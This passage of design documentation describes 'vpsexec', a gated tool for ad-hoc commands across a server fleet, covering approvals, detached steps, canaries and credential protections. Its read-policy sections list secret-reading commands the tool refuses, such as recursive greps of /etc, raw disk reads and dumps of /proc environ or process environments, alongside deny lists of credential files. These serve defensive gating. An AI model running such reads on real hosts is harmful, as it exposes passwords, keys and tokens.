# vpsexec — gated ad-hoc commands across the fleet

`vpscfg` runs contracted deploys. `vpsexec` is the other tool, for the two things
a contract cannot express:

- **restart a wedged process across several machines during an outage**
- **read five machines' logs at once**

It exists because the alternative is not "nobody runs ad-hoc commands" — it is
"everybody runs ad-hoc commands over raw ssh, unjournaled, ungated". This puts
that traffic through a door.

> **Why it is a separate tool.** `docs/STABILITY.md` lists *free-form remote
> shell through the executor* under **Never**, and `vpscfg/executor.py` promises
> every remote command is built from contract fields. vpsexec does not weaken
> that — no operator string ever reaches `executor.py`. It is a second door with
> its own, stricter gate stack.

## Grammar

```
vpsexec <hosts> '<command>' [flags]       # the command must be ONE argument
vpsexec <hosts> push <file> --sha256 <hex> [flags]   # see "Pushing a file"
```

`push` in the command position is a verb, not a remote command.

| Host spec | Means |
|---|---|
| `edge1` | one host |
| `web2,web3,edge1` | an explicit list, **run in the order named** |
| `@dns` | a group from `policies/*.yaml` |
| `@all` | every governed machine, once (aliases collapsed) |
| `@dns,edge1` | groups and hosts mix freely |

One machine reached by two names runs **once**, and the plan says so. Two
mechanisms cover it:

- **`alias_of` in the governor** — `web1` *is* `web1.example.internal`, and
  `relay1` *is* `worker1` (a renamed host keeps its old name working). Either
  name works; both resolve to the reachable one, and the plan prints
  `note: web1 is web1.example.internal (alias)`. **Postures are read from the
  canonical host**, and an alias whose
  posture disagrees with its target refuses the policy at load — otherwise
  aliasing would launder a posture: name the frozen box its other way and get a
  different answer.
- **ssh `HostName` collapse** — two `Host` stanzas pointing at one machine
  collapse to the first named, and the drop is printed.

The host registry is `~/.ssh/config`, and `Include` is followed the way
OpenSSH follows it: a relative path resolves against `~/.ssh`, `~` expands,
globs are allowed (sorted), includes nest, and a path matching nothing is
ignored, and a directory it matches is skipped (as ssh does). An included
file must be owned by you or root and not group/world-writable — ssh's own
rule — or it refuses. As in ssh, the first `HostName`/`User` for a name wins,
a `#` ends a `Host` line's patterns, and a name the line itself negates
(`Host db1 !db1`) is not registered. An `Include` inside a `Host` block is scoped to that block (its lines
apply to that block's names, and a `Host` line inside it registers only names
the block also matches); one inside a `Match` block registers nothing, since
`Match` conditions are not evaluated here, and a `Match` block no longer leaks
its `HostName`/`User` into the `Host` block before it. An include loop,
nesting deeper than 16 (ssh's own limit), or an included file that exists but
cannot be read (no permission, not UTF-8, not a regular file) **refuses** with the
file named — the registry is never read in part.

Together these are the fleet-scale version of the one-character-volume rule.

| Flag | Meaning |
|---|---|
| `--in NAME` | run inside this live container (repeatable) |
| `--in-match GLOB` | run inside every live container matching GLOB |
| `--in-all` | run inside every live container on each host |
| `--run` | actually execute; without it you get the plan and stop |
| `--reason "why"` | required for anything that is not a read; journaled forever |
| `--verify 'CMD'` | post-condition per host; must be a read; its failure fails that host |
| `--canary [N]` | first N hosts (default 1) must PASS before the rest are touched |
| `--compare` | reads only: group hosts by identical output, flag the odd one out |
| `--override=FILE` | an ad-hoc YAML authorisation file |
| `--break-glass` | reach frozen/lockdown hosts, backed by a committed runbook |
| `--require-blackout` | refuse hosts not inside an active maintenance window |
| `--approve=HASH` | non-interactive approval of one exact plan-hash. **Not** for break-glass on its own: there it must come with `--approval-contract` |
| `--approval-contract=FILE` / `--grant FILE` | a grant from `vpsexec grant new` replaces the typed `BREAK-GLASS:<n>` for a step it lists (TTY still required); on a listed step whose hosts need no elevation it replaces that step's ordinary phrase. Omitted: the plan LISTS the valid covering grants but the typed phrase follows — this door never spends a grant you did not ask for. `--grant auto` (or `--approval-contract=auto`) auto-picks one (never a grant minted `--for-release`) and refuses if none covers the plan. A refusal names the flag you used. See "Approval contracts" |
| `--no-grant` | never list or use a grant: the typed phrase only. Refused together with `--grant`/`--approval-contract` |
| `--incident=ID` | an open incident (`vpsexec incident open`) stands in for the committed runbook on the hosts it lists. Approval is a typed `GO:<host>` (several hosts: `GO:<first 6 of the plan-hash>`) at your terminal; refused with `--approve`, `--approval-contract` or `--grant`, and never lists or auto-picks a grant. See "Incident override" |
| `--timeout N` | per-host timeout in seconds. Without it: the matching runbook's `timeout:` (1-3600 s), else a prediction from the command (read 60 s, service restart 90 s, default mutation 120 s, DB/migration 180 s, rollout/image pull/compose up 240 s, script or package install 300 s), never above 300 s. The plan prints the value and why. |

Introspection verbs take no host and change nothing (`grant` and `incident`
are reserved too; they write only under `~/.vpscfg` and the journal, never to a
host):
`vpsexec hosts`, `vpsexec groups`, `vpsexec runbooks`, `vpsexec locks <hosts>`,
`vpsexec log [--reason X] [--host X] [--event X] [--since 2h] [-n N]`.
Those five words are reserved — a governed host using one refuses at startup.

## Execution order

**Reads fan out in parallel.** When you are reading five logs during an outage,
latency is the product. Output is buffered per host and printed grouped, in the
order you named them — five interleaved log streams help nobody.

**Mutations run serially, in the order you named the hosts, and continue past a
failure.** An outage response that stops halfway leaves you neither fixed nor
reverted. Every host reports, and the exit code is non-zero if any failed:

```
  [ok]   web2  rc=0
  [FAIL] web3  rc=1  Job for nginx.service failed
  [ok]   edge1  rc=0

SUMMARY — 3 host(s)
  2 ok, 1 failed of 3
```

A locked or unreachable host fails **that host only** — it cannot abort a fleet
already in motion. A host that cannot be *probed* during planning, however,
refuses the whole run: you cannot approve a plan that could not be computed.

## Detached steps and `vpsexec reconcile`

A mutation step is launched **detached** on the host, so it survives the SSH
session ending (`vpscfg/detach.py`). Its files live in
`/run/vpscfg-ops/<operation id>/` (0700 root): `<i>.sh` (the gated command),
`<i>.out`, `<i>.err`, `<i>.rc`, `<i>.unit`/`<i>.pid` (the runner),
`<i>.cpid` (the step, = its process-group id) and `<i>.cstart` (that leader's
start time: Linux `/proc/<pid>/stat` field 22, else `ps -o lstart=`). The
launcher is `systemd-run --unit vpscfg-<op16>-<i> --collect -p KillMode=mixed`.
The step runs in the session's working directory with its HOME and PATH,
under bash when present.

**Hosts without systemd refuse detached steps.** Without systemd a process
the step starts in a session of its own (a daemon that calls setsid) leaves
the step's process group, and no stop can reach it. So on a host with no
`systemd-run` (or not booted with systemd) the launch is refused before
anything is written — the step never starts, the lock is released, and the
door says how to opt in. A governor may accept that risk per host:

```json
"allow_unmanaged_steps": ["web1"]
```

(canonical host names only; an alias of a listed host counts as listed, an
alias in the list counts for nothing). Such a host launches under
`setsid nohup` as before.

**A failing `systemd-run` never falls back.** On a systemd host that is not
listed in `allow_unmanaged_steps`, a `systemd-run` that fails (a D-Bus
timeout, a unit name clash) does not drop to `setsid`/`nohup`: the launcher
claims the step's single-run guard (`<i>.started`), so the step can never
start — even if systemd started the unit after reporting the failure — and
replies `VPSCFG-SYSTEMD-FAILED`; the door refuses ("systemd-run failed …
step NOT started") and releases the lock. If the guard was already taken and
a runner wrote its pid (waited for up to 3 s), the unit did start the runner,
and the step is followed as launched. If the guard was taken but no runner
is recorded — an earlier fence or launch holds it — the launcher replies
`VPSCFG-FENCED-BY-OTHER`: this launch ran nothing, whether the step ran is
UNKNOWN, and the door keeps the lock (`vpsexec reconcile`). Only a
host listed in `allow_unmanaged_steps` may launch under `setsid`/`nohup`.

**The step runs in its own process group**, so it can be stopped whole: the
runner starts it under `setsid`, else under `perl -e 'setpgrp(0,0); exec …'`,
and confirms the step's process-group id equals its pid before it does work.
A host with neither `setsid` nor `perl`, or where the group cannot be
confirmed, never runs the step: the runner writes rc **125** and says why on
stderr. The runner's TERM trap is installed before anything else; a TERM that
arrives before the launch means the step never starts (rc **143**), and one
that arrives later is sent to the step's whole group (`kill -s TERM -- -<pgid>`;
dash needs `-s`, and the runner polls rather than blocking in `wait`, because
dash runs a trap only after `wait <pid>` returns). Under systemd,
`KillMode=mixed` sends the stop's TERM to the runner and SIGKILLs every
remaining process of the unit — including anything the step left running.

- The launch refuses unless `/run/vpscfg.lock/token` is still this operation's,
  so a step never starts without its lock, and a step never runs twice.
- The door polls the op dir, streams the log (masked, to a terminal only), and
  reads `<i>.rc`. A dropped poll is retried with backoff (1s doubling to 15s)
  until the step's timeout. Only if no poll succeeds for that whole time, or
  the step outlives its timeout, is completion "unknown" and the lock retained.
- stdout **and** stderr go to the journal step record (`stdout`, `stderr`;
  `detail` keeps its stderr-first 500-char shape), through the secret masker. A step that ends unknown is
  journaled with `uncertain: true` and whatever output was read, and the
  door's `mutation_complete` names it: `lock_retained: {host: operation id}`.
- On the host, each of `<i>.out` and `<i>.err` keeps at most the first 16 MiB;
  the rest is read and discarded, so a runaway step cannot fill `/run` and is
  never killed for its output. Each stream goes through a FIFO to a reader
  that copies one `read()` at a time with `dd bs=<n> count=1` straight into the
  log — no stdio buffer, so output reaches the log as it is written even while
  a background process the step left behind still holds the FIFO open (macOS
  `head -c` would have kept it buffered). The reader counts progress by the
  log's own size, never by dd's statistics text, and runs under
  `LC_ALL=C LANG=C`: no locale or dd dialect can make it stop early. The
  runner opens each FIFO read-write (which never blocks, so a TERM cannot
  interrupt the open and lose the exit code) BEFORE the readers start, then
  opens the read ends itself and hands them to the readers already open — no
  process ever opens a FIFO and waits for the other side. It holds its write
  ends until the step has started and closes them on every exit path, so a
  reader can never wait forever for a writer that never comes, nor the
  runner for a reader — not even after an early TERM or a SIGKILLed runner
  (its ends close with it). Under systemd the unit carries
  `RuntimeMaxSec=<step timeout + 60s>`; the runner passes the TERM on to the
  step's whole group.
- After the step exits, its log readers get **LOG_GRACE = 5 s** to reach end of
  file; then `<i>.rc` is written regardless. A reader still running then is
  held open by a process the step left in its group: that process makes the
  operation STILL RUNNING to reconcile (below), and its output keeps reaching
  the log up to the cap.
- **An exit code with a live group is not done.** If `<i>.rc` exists but a
  process of the step's group (or its unit, or its runner) is still alive,
  the door waits up to LOG_GRACE for it to end; after that the host is STILL
  RUNNING: the lock and the op dir are kept, the step is journaled
  `uncertain`, and the door says `next: vpsexec reconcile <host> --stop`.
  Systemd hosts and non-systemd hosts now end the same way — no step's
  process outlives the operation unnoticed while its lock is released: under
  systemd, `KillMode=mixed` kills what the step left when the unit ends; on
  an opted-in host without systemd the door keeps the lock until a human
  stops it.
- When the step's outcome is known the lock is released and the op dir is
  removed **in the same remote command**; a retained lock keeps its op dir as
  evidence until `reconcile` journals it and removes both. Only after that
  release does the door journal `host_done` (host, rc, verify rc, operation
  id, and the attempt's `reason` and `plan_hash`) — the one record `vpsrun
  --resume` accepts as "this host finished", and only when its reason and
  plan hash are that attempt's and it comes before the next attempt on that
  host. A `reconciled` record for the operation outranks it. A known
  operation whose lock a reconcile found free with no `host_done` (the door
  died between the release and that record) is "released by the door,
  outcome unknown": resume runs the step again, never SKIP-DONE.
- If the launch reply is lost and the step file never appears, the door
  claims the runner's single-run guard (`<i>.started`) before it reports "did
  not run", so a launch still in flight can never start it later. If the guard
  is already taken, a runner started: completion is followed, not assumed.
- Reads, `--verify` and `push` still run attached.

A retained lock prints its release valve, and `vpsrun` repeats it when a play
halts:

```
[BLOCKED: lock retained; reconcile operation 61233966… — next: vpsexec reconcile apps]
```

`vpsexec reconcile <host>` is TTY-only and run by a human. It prints the lock
owner, each step's rc and log tail, whether the unit, the runner or ANY
process in the step's process group still runs, the journal record, and the
runbook verify's result, then a verdict: `COMPLETED rc=N`, `STILL RUNNING`
(refused — never COMPLETED while a process of the step's group or unit is
alive) or `UNKNOWN`. On COMPLETED or
UNKNOWN it asks for `RECONCILE:<host>:<op8>` and releases that operation's lock
only, compare-and-delete on owner and token, journaling `reconcile_attempt` and
`reconciled`, then removes the op dir in the same remote command. It also
refuses when:

- the lock's controller (the owner records `controller: {host, pid, started}`,
  `started` being that process's own start time) is THIS machine and that pid
  is alive with that start time (±5 s) — whatever the journal says
  (`vpscfg deploy` journals no vpsexec attempt). The same pid on a process
  started at another time is a recycled pid: a dead controller. A controller
  field that is present but malformed (pid 0, -1, not an integer), or a live
  pid whose start time cannot be read, counts as alive; so does a `started`
  that is not a positive integer (0 or negative is malformed, never compared
  as a time). A door that could not
  read its own start time records `started: null` (never a guess such as
  "now"), which also counts as alive. The refusal shows the
  `ps` command to find the process;
- the lock has no op dir (taken by `vpscfg deploy`, a push or an older door)
  and is younger than **7200 s** — twice the longest step any lock holder may
  run, derived from the real caps: `max(runbook timeout 3600 s
  (vpsexecpolicy.RUNBOOK_TIMEOUT_MAX), executor step 1800 s
  (executor.MAX_STEP_SECONDS), k3s rollout 900 s + 60 s)` = 3600 s, doubled
  (`vpsexec.unproven_lock_min_age()`): its work cannot be proven finished.

A free lock is journaled (`reconcile_free`) — `vpsrun --resume` reads it.

`vpsexec reconcile <host> --stop` stops a STILL RUNNING operation: TTY only,
phrase `STOP:<host>:<op8>`, journaled (`reconcile_stop_attempt` before,
`reconcile_stopped` after). It sends TERM to every process of the step's
systemd unit, to the step's whole process group when its leader is alive with
the start time recorded in `<i>.cstart`, and to the runner if its argv still
names the op dir. It **signals nothing and refuses** when any step's group
cannot be proven to be the step's: the leader's pid is alive with another
start time (REUSED — reconcile also reports such a step UNKNOWN), or the
leader is gone while the group still has members (LEADERLESS) that do not
all prove they are the step's. Session and start time alone cannot prove
that: an unrelated `setsid`'d process that got the same pid after the step's
group ended (and has since exited, leaving its own children) passes both. So
the runner TAGS the step: it starts it with `VPSCFG_OP=<op>.<i>` in its
environment, which every process of the step inherits. A leaderless group IS
signalled only when, from Linux `/proc`, every member (at least one) is in the
session the step's `setsid` created (session id = the pgid), started no
earlier than the leader (`<i>.cstart`), AND carries exactly that tag in
`/proc/<pid>/environ` (NUL-separated entries; a value cannot forge one). A
member without the tag — including one that cleared its environment, or
whose environ cannot be read — refuses. Off Linux nothing can prove it, so it
always refuses there. On refusal it journals
`reconcile_stop_refused` and prints the `ps -g <pgid>` command for a human to
act by hand. It releases nothing: run `vpsexec reconcile <host>` afterwards,
with the evidence. See docs/RECOVERY.md.

## Checks — named read plays

The three things you most often want to know across a fleet — *what is broken*,
*what is listening*, *what is full* — are all **reads**. They need no runbook,
no `--run` and no approval; they already work everywhere. What they did need was
a name and the right flags, worked out once:

```
$ vpsexec check                 # what is available
$ vpsexec check failed          # what is broken, everywhere
$ vpsexec check disk @docker    # override the default host set
```

`policies/checks.yaml` ships 13, in three families:

| Family | Checks |
|---|---|
| services | `failed`, `services`, `enabled`, `degraded`, `boot-errors` |
| init / inet | `listening`, `sockets`, `inetd` |
| disk | `disk`, `inodes`, `disk-hogs`, `docker-disk`, `journal-size` |

Several default to `--compare`, which is where they earn their keep:
`check enabled` across `dns1`/`dns2` shows a drifted pair as the divergent group,
and `check inetd` is useful precisely because every host should agree on
"nothing".

**A check's command must classify as a read**, enforced when it runs and pinned
by a test over the shipped file. A check executes with no `--run` and no
approval, so a mutating one would be a hole rather than a convenience — it
re-enters the normal dispatch with the command spelled out, so the floor, the
secret paths and the tier rules all still apply. It is a shortcut for typing,
never a shortcut past a gate.

The *actions* those checks lead to are runbooks, and they live in
`policies/examples/runbooks-triage.yaml` — inert until reviewed and armed. Each
one names the check that should have led you to it and carries the
post-condition that proves it worked.

Note what is deliberately missing there: **no docker prune in any form**.
`check docker-disk` will tell you the size and offer no remedy, because every
reclaim form is deny-always floor. That is the near-miss this repo was built
around.

## Post-conditions

`systemctl restart nginx` returning 0 is not evidence that nginx serves. A
mutation with no post-condition says so in its own plan:

```
  verify  : NONE — rc=0 is the only evidence this worked
```

Give it one with `--verify`, or bake it into the runbook so the check travels
with the authorisation:

```yaml
runbooks:
  - hosts: [web1, web2, web3]
    cmd: "systemctl restart nginx"
    verify: "systemctl is-active nginx"
    break_glass: true
    why: "runbook 07 — wedged nginx worker pool"
```

The post-condition runs **on the host, after the command, per host**, and its
failure fails that host. Different runbooks may check different things in one
fleet command — each host uses the verify from the runbook that authorised it.

**A post-condition must classify as a read.** It runs with no approval,
immediately after a mutation; if it could change anything it would be a second
command smuggled past every gate rather than a check. `--verify './cleanup.sh'`
is refused.

**Letting a service settle: `verify_retry`.** A service that takes a few
seconds to come up fails an HTTP verify that runs the instant the restart
returns. A runbook entry may say how long to wait for it:

```yaml
  - hosts: [web1]
    cmd: "docker compose --project-directory /srv/shop up -d"
    verify: "curl -qfsS http://127.0.0.1:8080/healthz"
    verify_retry: {tries: 10, interval: 3}   # up to 10 tries, 3 s apart
```

The verify runs up to `tries` times, sleeping `interval` seconds between
attempts, and passes on the first success; only the last failure fails the
host. Without the key it runs once, as before. Both sub-keys are required and
nothing else is allowed: `tries` 1-30, `interval` 1-60 whole seconds, and
`tries × interval` at most 600. It needs a `verify` on the same entry, it is
refused in an ad-hoc `--override` file, and an explicit `--verify` replaces
the runbook's verify **and** its retry (that check runs once). The retried
command is the same verify, so it must still classify as a read. The plan
prints `verify : CMD (up to N tries, Ns apart)`, the retry is part of the
plan-hash (plans without one keep their old hash), and each attempt is
journaled as its own `verify` record with `attempt`/`tries`, shown by
`vpsexec last` as `[verify 2/10]`. The per-host lock is held while it waits.
The **whole** retry is bounded, attempts included: each retried attempt times
out after at most 60 s (or the per-host timeout, if shorter), and attempts
plus sleeps end by a monotonic deadline of 600 s from the first attempt; when
no room is left for another sleep and attempt it stops early and the host
fails with `retry budget of 600s spent after k of N tries`. As for any verify,
an attempt that times out is a transport failure (the lock is retained). A
single-try verify keeps the full per-host timeout.

## Canary

Continue-on-error finishes the job. The canary is what stops a bad command from
reaching every machine:

```
$ vpsexec @docker 'systemctl restart nginx' --canary --run \
      --verify 'systemctl is-active nginx' --reason "INC-4471"

  CANARY — 1 of 4 host(s) first: web1.example.internal
  [ok] web1.example.internal rc=0  verify ok
  CANARY PASSED
  Canary passed. Type CONTINUE for the remaining 3 host(s):
```

A canary that fails — from the command *or* its post-condition — halts, and the
remaining hosts are **not touched**. With `--approve` (never break-glass alone), a passing canary
continues automatically: the plan-hash already authorised the whole fleet and
the canary was the gate. `--canary` is in the plan-hash, so a plan approved
with one cannot be run without it.

## Comparing a fleet

Reading five machines is rarely about five outputs — it is about which one is
different:

```
$ vpsexec @docker 'nginx -v' --compare

COMPARE — 4 host(s), 2 distinct result(s)

  3 hosts  web1.example.internal, web2, edge1
      nginx/1.18.0

  1 host   web3   ← divergent
      nginx/1.14.2
```

With no majority (an even split, or every host different) it says
`no majority — every host differs` rather than guessing which one is odd.
`--compare` is refused for mutations, where grouping by output would hide
per-host failures.

## Maintenance windows

vpsexec reads `blackout list --active` (an external maintenance-window tool,
optional) and reports each host's
window status in the plan. **Advisory by default, and it can only tighten** —
being inside a window never grants anything, because a second, weaker
authorisation path would quietly become the easy one. Posture and runbooks
still decide.

`--require-blackout` refuses hosts outside a window. Information fails open (no
blackout tool ⇒ "unknown", blocks nothing); strictness fails closed (if you
asked for `--require-blackout` and the answer cannot be determined, it refuses —
an unverifiable maintenance window is not a maintenance window).

## The repeat guard

People mash commands during an incident. If an identical plan-hash ran within
the last 5 minutes, the plan carries a warning. Unattended (`--approve`) it is
**refused** — a script re-firing the same mutation is more likely a bug than
intent. Reads are never repeat-guarded.

`vpsrun` waits this guard out in exactly one case: the refusal is the guard
alone, and every attempt of that plan inside the window is the same run's own
failed attempt at the same step (matched by the run id vpsrun puts in every
`--reason`, and by its own journal). It counts the window down on screen and
asks the door again; the door's guard still decides. Another run's identical
plan — including an earlier run of the same release — still refuses. See
**Releases** below.

## Credential paths

`cat /opt/app/.env.production` is a **read**: no `--run`, no approval, works on
frozen hosts. An estate's `policies/secrets.yaml` therefore adds the credential paths to
`deny_extra`, which is absolute — no runbook, override, break-glass or approval
lifts it. It denies the *paths*, not service names, so
`docker logs secrets-prod` still works. It also covers
`/shadow`, `gshadow`, `sasl_passwd`, `.my.cnf`, `debian.cnf`, shell and client
histories, the k3s server token, TLS directory, datastore, `cred/` files and
`config.yaml`, Docker's `config.v2.json`, `/run/secrets/`, service-account
tokens, `/etc/wireguard/`, `vault.d/`, `.netrc`, `opasswd` and `rclone.conf`.

### Recursive reads (tree reads)

`deny_extra` matches command *text*, so it cannot see what a directory argument
expands to: `grep -r -a . /etc` names no credential path and, without the
gate below, is a read that prints `/etc/hsm/pin`, every `server.key` and every `.pem`
under `/etc`. `readpolicy.tree_read_verdict` therefore looks at the **root** of
every command that reads file contents across a directory, whatever its tier:

| Form | Counted as a tree read when |
|---|---|
| `grep` `egrep` `fgrep` `zgrep` `zegrep` `zfgrep` | `-r`/`-R` (bundled too: `-rn`, `-ra`), `--recursive` or any prefix of it (`--rec`), `--dereference-recursive`, `-d`/`--directories` with any value but `read`/`skip`, or `GREP_OPTIONS` anywhere in the line (grep 3.3 on Debian 10 still honours it) |
| `rgrep` `rg` `ag` `ack` | always (they recurse by default) |
| `diff` | `-r`/`--recursive`, `-N`/`--new-file`, `--unidirectional-new-file`; a plain `diff` of two directories gets the refusal rule below for its operands |
| `find` | `-exec`/`-execdir`/`-ok`/`-okdir` running anything but a name-only command (`rm`, `chmod`, `ls`, `stat`, `du`, `wc`, `md5sum`, ...) |
| `xargs` `parallel` | running anything but a name-only command (or `docker`/`kill`, which take names): its file list comes from stdin, so its tree is never known |
| `bzgrep` `xzgrep` `lzgrep` `zstdgrep` `pcregrep` `pcre2grep` `ugrep` `ug` | as `grep` |
| `sift` `pt` | always, like `rg` |
| `git grep --no-index` | always (its pathspecs are the roots) |
| `tar` | creating an archive on stdout: no `-f`, `-f -`, or `-O` (`tar cf - /etc`, `tar -cO /etc`, `tar c /etc`) |

A tree head is found at the start of a segment, after a wrapper (`sudo`,
`env`, `timeout`, `nice`, `xargs`, `parallel`, `exec`, `toybox`, `unshare`,
`systemd-run`, `setpriv`, `prlimit`, `strace`, `ltrace`, `numactl`, `cgexec`,
`firejail`, ...), a shell keyword (`then`, `do`, `else`, `elif`, `if`, `while`,
`until`, `!`, `time`) or a `VAR=value` prefix, and
inside the quoted command of `sh -c`/`bash -c`/`ssh host '...'`. Roots are
normalised component-wise after the shell's quote and backslash removal
(`//etc/`, `/./etc`, `'/e'tc`, `/e\tc` are all `/etc`).

Per root, failing closed at every step:

- **Refused**, absolutely (no runbook, override, break-glass or approval lifts
  it, exactly like `deny_extra`), when the root is relative, `.`, `~` or
  missing (the remote cwd is unknown), has a `..` component (a symlinked parent
  makes lexical normalisation wrong), is under `/proc` (`/proc/<pid>/root` is
  `/` again), is equal to or an ancestor of a broad root (`/`, `/etc`, `/var`,
  `/var/lib`, `/root`, `/home`, `/opt`, `/srv`, `/run`, `/usr/local/etc`,
  `/proc`, `/sys`, `/tmp`, `/var/tmp`, `/var/backups`, `/var/www`, `/var/spool`,
  `/mnt`, `/media`, `/boot`, `/dev`, `/var/lib/docker`, `/var/lib/rancher`,
  `/var/lib/kubelet`, `/etc/ssl`, `/etc/letsencrypt`, `/etc/rancher`, and so
  `/usr` and `/usr/local` too), overlaps an absolute `deny_extra` path
  (ancestor, equal or inside), or contains a deny pattern once normalised.
- **Never a read** (needs `--run` and an approval, with the plan in front of a
  human) when it is any other root outside `/var/log`. Most `deny_extra`
  entries are *filename* patterns (`.env.production`, `id_rsa`, `.pem`,
  `server.key`, `htpasswd`) with no directory, so "an ancestor of a denied path"
  is every directory: `/opt/app/src/.env.production` is the common case. Only
  the log trees are taken to hold no credential file.
- **Unchanged** under `/var/log`: `grep -r ERROR /var/log/nginx` is still a read.

The refusal names the root and the reason and says what to do instead: name
the exact files, or narrow the root to a tree under `/var/log`. `ls -R`, `du`,
`lsattr -R`, `getfacl -R` and `find ... -print/-ls` print names and metadata,
not contents, and are untouched. Pinned by `tests/test_tree_reads.py`.

A plain (non-recursive) `diff` outside `/var/log` is a read only when both
operands look like files: the last dot-component names a known suffix
(`nginx.conf`, `compose.yaml`), or a backup suffix follows one
(`nginx.conf.bak`). `app.service.d`, `sources.list.d.bak` and `hosts.bak` are
taken to be directories. The door cannot stat, and two
directories compare every same-named file in them, so `diff /opt/app
/opt/app.bak` and `diff /etc/postfix /etc/postfix.orig` need an approval.

Known residuals: a symlink already on the host inside an allowed tree (host
configuration is trusted throughout `readpolicy`); a plain `diff` of two
directories whose names end in a file suffix (`/opt/x.conf`); `tar` writing an
archive to a file, and other archivers (`zip`, `cpio`), which are mutations and
are left to the approval because shipped runbooks back up trees with `tar`;
and, for any command that is not a read, whatever a shell can assemble that a
scanner cannot see (`python3 -c ...`, `awk 'BEGIN{system(...)}'`, an alias) —
an approved mutation can read anything, which is why it needs the approval.

### Raw devices, process memory and credential files (path reads)

A raw block device is every file on the disk, `/dev/mem` and `/proc/kcore` are
memory, `/proc/<pid>/environ` is a process's secrets — and none of them names a
`deny_extra` path, so without this gate `cat /dev/vda`, `strings -n 8 /dev/vda1`
and `cat /proc/1/environ` would be reads. `readpolicy.path_read_verdict` looks at
every path a content reader reads (`cat`, `head`, `tail`, `strings`, `zcat`,
`od`, `xxd`, `base64`, `cut`, `sort`, `diff`, `cmp`, `jq`, `xargs`, the grep
family's files and `-f` values but never its pattern, ...; `if=`/`--file=`
values and attached option values too), the files named by `-f`/`--filename`/
`--values`/`--env-file`/`--from-file` of `kubectl`, `k3s`, `helm`, `crictl`
and `docker`, and every `<` redirection source, after
the same normalisation as tree roots. A relative path is also checked as if the
cwd were `/` (an `--in` container's WORKDIR often is).

- **Refused**, absolutely: anything under `/dev` except `/dev/null` and the
  streams below (the door cannot tell a disk from a tty by name, so it does
  not try); `/proc/kcore` and any `/proc` path with an `environ`, `mem`,
  `pagemap`, `fd` or `map_files` component (`/proc/1/task/1/environ` too); a
  path with a `..` component (`/var/run/../proc/kcore` is `/proc/kcore`); and
  credential files a substring cannot match precisely: an ssh host private key
  and any copy of it (`ssh_host_<alg>_key` anywhere in the name; only names
  ending `_key.pub`/`_key-cert.pub` are public), `*.key` and `*.key.*`,
  `.env`, `.envrc`, `.env[._-]*`, `*.env`, `*.env[._-]*`, `*.private`,
  `*.private.*` and `rancher/k3s/registries.yaml`. These bind **content reads
  only**: jq's `.key` filter, `ls -l`/`stat`/`find -name` of a host key and
  `chmod 0600 /opt/x/.env` in `secret-perms.yaml` keep their tier.
- **Refused**: `ps` with a BSD `e` option word (`ps axe`, `ps eww`,
  `ps -p 1 e`) or an `env` format field prints every process's environment.
  `ps -ef`, `ps aux` and `ps -eo pid,comm` stay reads (procps `-e` is every
  process; on a macOS BSD `ps`, `-e` would be the environment, but the doors
  only ever run `ps` on the Linux fleet). If its UNIX parse fails for any
  reason (an unknown user, a pid out of range, an unknown format field, a
  stray `-`), procps reparses the WHOLE argv as BSD, where `ps -eux` is
  e, u, x. So `ps` is a read only inside a strict allowlist: flags made of
  `e A f F l y H w L T j` (`-ef`, `-eLf`, `-efww`), `--forest`,
  `--no-headers`, `--headers`; the words `aux auxw auxww ax axu axww axf auxf
  axjf`; `-p/-q/--pid/--ppid` pids 1..4194304; `-u/-U/-g/-G/--user/--group`
  ids 0..4294967294; `-o/-O/--format` fields from a fixed list (pid, ppid, user, comm, args, etime, pcpu, %mem, rss, stat, tty, ...;
  never an env field) — and at most ONE format source: an `-o` list or a
  format flag from `f F l y j`, never both (`ps -ef -o args` fails the UNIX
  parse with "conflicting format options" and leaked every environment on
  real procps), and a BSD word only on its own. Anything else is not a read, and is refused when an
  `e` appears anywhere in its argv (`ps -e -p 0`, `ps -e -o x`). `-C` and
  `--sort` are never reads (`ps -e --sort pid` is refused). For a read, use `ps -u <uid>`,
  `ps -p <pid>` or `ps -ef | grep NAME`. `ps` behind a wrapper
  (`sudo docker ps ...`) is analysed as procps: the door cannot tell
  `sudo docker ps` from `sudo -u docker ps`. `tools/procps-oracle.sh` (opt-in,
  Docker, local only) runs every form in `tests/data/procps_oracle/forms.txt`
  on real procps (Debian 10 3.3.15 and Debian 12 4.0.2) with a canary in every
  environment; the recorded verdicts are pinned by the test suite: a form that
  leaked must be refused, and a door read must never leak.
- **Never a read**: `/dev/zero`, `/dev/full`, `/dev/random`, `/dev/urandom`
  (they never end), `/proc/<pid>/root` and `/cwd` (another namespace's whole
  tree; a device or memory path behind them is refused), `/proc/kmsg` (reading
  it consumes the kernel log) and anything under `/sys`.
- **Unchanged**: `/proc/loadavg`, `/proc/meminfo`, `/proc/<pid>/status` and
  `cmdline`, and every head that prints names and metadata: `ls /dev`,
  `stat /dev/sda`, `lsblk`, `df`, `smartctl -H /dev/sda`, `mdadm --detail`.
  `kubectl`, `docker`, `helm`, `journalctl`, `systemctl` and `ps` are not
  metadata heads: a device or credential path anywhere in their arguments
  makes them not a read.

A path that contains a `deny_extra` pattern only once normalised
(`/var/lib/rancher/k3s//server/token`) is refused too. `dd if=` was already
floor. Pinned by `tests/test_door_device_reads.py`. Residuals: a symlink on the
host into `/dev` or `/proc`; `cd /dev && cat sda` (`cd` is never a read, so
that is an approved mutation); interpreters and network tools sending a file
elsewhere, which are never reads.

## Secret values in output (`vpscfg/secretmask.py`)

Denying paths does not stop a secret *value* reaching the screen: an inline env
in `kubectl get deploy -o yaml`, `docker inspect` Env, `ps` argv, a DSN in a log
line. A database password once reached an agent transcript that way, through
a local `sed` "filter" that did not filter on macOS. So the door masks,
not the operator's pipe: every remote stdout/stderr is passed through
`secretmask.mask()` **right after ssh returns**, before it reaches the result,
`--compare`, the terminal, the journal or telemetry. `vpscfg logs`, probes and
the executor's step detail go through it too.

It masks values next to secret-looking keys (`*PASSWORD*`, `*TOKEN*`,
`*SECRET*`, `*_KEY`, `DSN`, `DATABASE_URL`, …) in `.env`/YAML/JSON/escaped
JSON/argv/libpq/ADO/systemd forms; k8s env `name`/`value` pairs (YAML and
`-o json`, including the last-applied annotation); k8s `Secret` data and Vault
kv (tables and JSON); argv lists and flag-then-value lines (`--requirepass`,
k3s `'--token' \`, redis `CONFIG GET`); URL userinfo, `Authorization`,
`Cookie`, `curl -u`, `redis-cli -a`, `mysql -p`, `sshpass -p`; PEM private
keys (even truncated); crypt/htpasswd/SCRAM/`md5…` hashes; and known token
formats (GitHub, AWS, Slack, Vault, k3s `K10…`, age, Tailscale, JWTs, …); postgres `PASSWORD '…'`
